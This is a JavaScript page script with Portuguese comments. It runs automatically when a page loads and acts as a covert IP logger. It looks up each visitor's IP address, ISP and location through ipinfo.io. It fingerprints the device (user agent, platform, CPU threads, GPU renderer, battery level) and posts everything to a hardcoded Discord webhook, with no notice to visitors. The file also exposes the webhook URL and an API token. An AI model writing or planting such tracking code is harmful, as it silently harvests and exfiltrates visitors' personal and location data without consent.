// Webhook do Discord
const webhookUrl = "https://discord.com/api/webhooks/1285449693119123537/gdenuvZZrZvnZqWk1kuPeMafhPTt8lmTeEqWumOLumIybOwvfjTlAszprH-eCzVg9aqC";

// Função para obter informações de IP e enviar ao Discord
async function getIp() {
    try {
        const response = await fetch('https://ipinfo.io/json?token=79993a385bef06');
        const data = await response.json();
        const ip = data.ip;
        const city = data.city || 'Desconhecida';
        const region = data.region || 'Desconhecida';
        const country = data.country || 'Desconhecido';
        const org = data.org || 'Desconhecida'; // Provedor de internet

        // Coletar outras informações do dispositivo
        const deviceInfo = await getDeviceInfo();

        // Montar a mensagem com todas as informações
        const message = `Novo visitante:
- IP: ${ip}
- Provedor: ${org}
- Localização: ${city}, ${region}, ${country}
- Navegador: ${deviceInfo.browser}
- Sistema Operacional: ${deviceInfo.os}
- CPU: ${deviceInfo.cpu}
- GPU: ${deviceInfo.gpu}
- Percentual de Bateria: ${deviceInfo.battery}%`;

        // Enviar o IP e as outras informações para o Discord via Webhook
        sendToDiscord(message);

    } catch (error) {
        console.error('Erro ao obter o IP e outras informações:', error);
    }
}

// Função para coletar informações do navegador e do dispositivo
async function getDeviceInfo() {
    const navigatorInfo = window.navigator;
    const batteryInfo = await getBatteryInfo();

    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl');
    let gpuInfo = 'Desconhecida';

    if (gl) {
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
            gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
        }
    }

    return {
        browser: navigatorInfo.userAgent,
        os: navigatorInfo.platform,
        cpu: navigatorInfo.hardwareConcurrency || 'Desconhecido', // Threads de CPU
        gpu: gpuInfo,
        battery: batteryInfo
    };
}

// Função para obter o status da bateria
async function getBatteryInfo() {
    if ('getBattery' in navigator) {
        const battery = await navigator.getBattery();
        return Math.floor(battery.level * 100); // Percentual de bateria
    } else {
        return 'Desconhecida'; // Caso a API não esteja disponível
    }
}

// Função para enviar dados ao Discord
function sendToDiscord(message) {
    const payload = {
        content: message
    };

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload)
    }).then(response => {
        if (response.ok) {
            console.log('Informações enviadas para o Discord');
        } else {
            console.error('Erro ao enviar informações para o Discord');
        }
    }).catch(error => {
        console.error('Erro na requisição para o Discord:', error);
    });
}

// Chama a função ao carregar a página
getIp();
